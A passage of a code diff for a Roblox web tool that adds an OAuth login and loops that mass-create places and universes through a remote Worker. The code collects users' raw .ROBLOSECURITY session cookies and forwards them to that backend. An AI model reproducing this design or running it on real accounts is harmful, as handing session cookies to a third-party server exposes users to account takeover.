+        `scope=openid%20profile&` +
+        `code_challenge=${codeChallenge}&` +
+        `code_challenge_method=S256&` +
+        `state=${state}`;
+
+      window.location.href = authUrl;
     }
 
-    setStatus('u', 'Done. ' + ok + ' succeeded, ' + err + ' failed.', ok > 0 ? 'done' : 'error');
-    log('Finished: ' + ok + ' universes created, ' + err + ' failed.', 'info');
-    document.getElementById('u-btn').disabled = false;
-    running = false;
-  }
+    document.getElementById('robloxLoginBtn').addEventListener('click', startRobloxAuth);
+    document.querySelectorAll('.authPageBtn').forEach(btn => btn.addEventListener('click', startRobloxAuth));
 
-  async function runPlaces() {
-    if (!activeCookie) { alert('Session invalid. Please log in again.'); logout(); return; }
+    function logoutRoblox() {
+      localStorage.removeItem("roblox_token");
+      document.getElementById('robloxLoginBtn').style.display = 'flex';
+      document.getElementById('userProfile').style.display = 'none';
 
-    const universeId = document.getElementById('p-universe').value.trim();
-    const template   = parseInt(document.getElementById('p-template').value) || 95206881;
-    const count      = parseInt(document.getElementById('p-count').value)    || 1;
-    const delay      = parseFloat(document.getElementById('p-delay').value)  || 1;
+      document.getElementById('place-key').value = "";
+      document.getElementById('universe-key').value = "";
 
-    if (!universeId || isNaN(universeId)) { alert('Please enter a valid Universe ID.'); return; }
+      notify("Logged out from Roblox account.", "info");
+      appendLog("User logged out.", "INFO");
+    }
 
-    running = true;
-    switchTab('log');
-    document.getElementById('p-btn').disabled = true;
-    setProgress('p', 0, count);
+    function setLoggedInUser(username, token) {
+      document.getElementById('robloxLoginBtn').style.display = 'none';
+      document.getElementById('userProfile').style.display = 'flex';
+      document.getElementById('usernameLabel').innerText = username;
+      document.getElementById('userAvatar').innerText = username.charAt(0).toUpperCase();
 
-    let ok = 0, err = 0;
-    for (let i = 1; i <= count; i++) {
-      if (!running) { log('Stopped by user.', 'info'); break; }
-      setStatus('p', 'Creating place ' + i + ' of ' + count + '...', 'running');
-      try {
-        const res = await callWorker({ action: 'createPlace', cookie: activeCookie, universeId, templateId: template });
-        log('[Place ' + i + '/' + count + '] ' + res.message, res.ok ? 'ok' : 'err');
-        res.ok ? ok++ : err++;
-      } catch (e) {
-        log('[Place ' + i + '/' + count + '] Request failed.', 'err');
-        err++;
+      document.getElementById('place-key').value = token;
+      document.getElementById('universe-key').value = token;
+    }
+
+    // --- PROCESSAMENTO DO RETORNO OAUTH ---
+    window.addEventListener('DOMContentLoaded', () => {
+      const urlParams = new URLSearchParams(window.location.search);
+      const code = urlParams.get('code');
+      const returnedState = urlParams.get('state');
+
+      if (code) {
+        const savedState = localStorage.getItem("roblox_state");
+        if (returnedState && savedState && returnedState !== savedState) {
+          notify("Security error: State parameter mismatch!", "error");
+          appendLog("OAuth Error: Invalid state parameter.", "ERROR");
+          return;
+        }
+
+        notify("Processing Roblox authentication...", "info");
+        appendLog("Code received from Roblox. Exchanging for token...", "INFO");
+
+        const storedVerifier = localStorage.getItem("roblox_verifier");
+
+        fetch(ROBLOX_TOKEN_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({
+            'client_id': CLIENT_ID,
+            'grant_type': 'authorization_code',
+            'code': code,
+            'redirect_uri': REDIRECT_URI,
+            'code_verifier': storedVerifier
+          })
+        })
+        .then(res => res.json())
+        .then(data => {
+          if (data.access_token) {
+            localStorage.setItem("roblox_token", data.access_token);
+            
+            fetch(ROBLOX_USERINFO_URL, {
+              headers: { 'Authorization': 'Bearer ' + data.access_token }
+            })
+            .then(res => res.json())
+            .then(userData => {
+              const name = userData.preferred_username || userData.name || "RobloxDev";
+              setLoggedInUser(name, data.access_token);
+              notify(`Authenticated successfully as ${name}!`, "success");
+              appendLog(`Authenticated user: ${name}`, "SUCCESS");
+            })
+            .catch(() => {
+              setLoggedInUser("RobloxUser", data.access_token);
+              notify("Authenticated with token!", "success");
+            });
+
+            window.history.replaceState({}, document.title, window.location.pathname);
+          } else {
+            notify("Error validating token with Roblox.", "error");
+            appendLog(`OAuth Error: ${JSON.stringify(data)}`, "ERROR");
+          }
+        })
+        .catch(err => {
+          notify("Failed to connect to Roblox authentication server.", "error");
+          appendLog(`OAuth Fetch Error: ${err.message}`, "ERROR");
+        });
       }
-      setProgress('p', i, count);
-      if (i < count && running) await sleep(delay * 1000);
+    });
+
+    // --- LÓGICA DE PUBLICAÇÃO VIA WORKER ---
+    async function handleCreatePlace() {
+      const key = document.getElementById('place-key').value.trim();
+      const universeId = document.getElementById('place-universe-id').value.trim();
+      const template = parseInt(document.getElementById('place-template-id').value) || 95206881;
+      const count = parseInt(document.getElementById('place-count').value) || 1;
+      const delay = parseFloat(document.getElementById('place-delay').value) || 1;
+
+      if (!key) {
+        notify("API Key or .ROBLOSECURITY is required!", "error");
+        appendLog("Create Place failed: Missing authentication key/cookie.", "ERROR");
+        return;
+      }
+
+      if (!universeId || isNaN(universeId)) {
+        notify("Valid Universe ID is required!", "warning");
+        appendLog("Create Place failed: Missing or invalid Universe ID.", "ERROR");
+        return;
+      }
+
+      const btn = document.getElementById('btn-create-place');
+      btn.disabled = true;
+
+      notify(`Executing Create Place (${count}x)...`, "info");
+      appendLog(`Starting Create Place | Universe: ${universeId} | Template: ${template} | Count: ${count} | Delay: ${delay}s`, "INFO");
+
+      let ok = 0, err = 0;
+
+      for (let i = 1; i <= count; i++) {
+        appendLog(`[${i}/${count}] Sending request to Worker...`, "INFO");
+        try {
+          const res = await callWorker({
+            action: 'createPlace',
+            cookie: key,
+            universeId: universeId,
+            templateId: template
+          });
+
+          if (res.ok) {
+            ok++;
+            appendLog(`[Place ${i}/${count}] SUCCESS: ${res.message}`, "SUCCESS");
+          } else {
+            err++;
+            appendLog(`[Place ${i}/${count}] ERROR: ${res.message}`, "ERROR");
+          }
+        } catch (e) {
+          err++;
+          appendLog(`[Place ${i}/${count}] Connection failed: ${e.message}`, "ERROR");
+        }
+
+        if (i < count) await sleep(delay * 1000);
+      }
+
+      btn.disabled = false;
+      notify(`Finished: ${ok} succeeded, ${err} failed.`, ok > 0 ? "success" : "error");
+      appendLog(`Completed Create Place job. Success: ${ok}, Failed: ${err}`, "INFO");
     }
 
-    setStatus('p', 'Done. ' + ok + ' succeeded, ' + err + ' failed.', ok > 0 ? 'done' : 'error');
-    log('Finished: ' + ok + ' places created, ' + err + ' failed.', 'info');
-    document.getElementById('p-btn').disabled = false;
-    running = false;
-  }
-</script>
+    async function handleCreateUniverse() {
+      const key = document.getElementById('universe-key').value.trim();
+      const template = parseInt(document.getElementById('universe-template-id').value) || 95206881;
+      const count = parseInt(document.getElementById('universe-count').value) || 1;
+      const delay = parseFloat(document.getElementById('universe-delay').value) || 1;
+
+      if (!key) {
+        notify("API Key or .ROBLOSECURITY is required!", "error");
+        appendLog("Create Universe failed: Missing authentication key/cookie.", "ERROR");
+        return;
+      }
+
+      const btn = document.getElementById('btn-create-universe');
+      btn.disabled = true;
+
+      notify(`Executing Create Universe (${count}x)...`, "info");
+      appendLog(`Starting Create Universe | Template: ${template} | Count: ${count} | Delay: ${delay}s`, "INFO");
+
+      let ok = 0, err = 0;
+
+      for (let i = 1; i <= count; i++) {
+        appendLog(`[${i}/${count}] Sending request to Worker...`, "INFO");
+        try {
+          const res = await callWorker({
+            action: 'createUniverse',
+            cookie: key,
+            templateId: template
+          });
+
+          if (res.ok) {
+            ok++;
+            appendLog(`[Universe ${i}/${count}] SUCCESS: ${res.message}`, "SUCCESS");
+          } else {
+            err++;
+            appendLog(`[Universe ${i}/${count}] ERROR: ${res.message}`, "ERROR");
+          }
+        } catch (e) {
+          err++;
+          appendLog(`[Universe ${i}/${count}] Connection failed: ${e.message}`, "ERROR");
+        }
+
+        if (i < count) await sleep(delay * 1000);
+      }
+
+      btn.disabled = false;
+      notify(`Finished: ${ok} succeeded, ${err} failed.`, ok > 0 ? "success" : "error");
+      appendLog(`Completed Create Universe job. Success: ${ok}, Failed: ${err}`, "INFO");
+    }
+  </script>
 </body>
 </html>
